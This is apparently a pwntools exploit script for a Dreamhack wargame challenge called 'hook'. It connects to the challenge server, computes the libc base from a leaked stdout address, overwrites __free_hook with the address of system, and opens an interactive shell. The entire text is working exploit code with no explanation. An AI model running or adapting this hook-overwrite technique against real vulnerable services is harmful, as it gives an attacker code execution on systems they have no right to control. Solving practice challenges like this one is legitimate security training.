from pwn import *

p = remote("host1.dreamhack.games", 15257)
elf = ELF("./hook")

free_offset = 0x3c67a8
binsh = elf.plt["system"]

p.recvuntil("stdout: ")
stdout = int(p.recvuntil(b"\n").strip(b"\n"),16)
base_addr = stdout - 0x3c5620

p.recvuntil(": ")
p.sendline("100")

free_hook = base_addr + free_offset

payload = p64(free_hook)
payload += p64(binsh)

p.recvuntil(": ")
p.send(payload)

p.interactive()
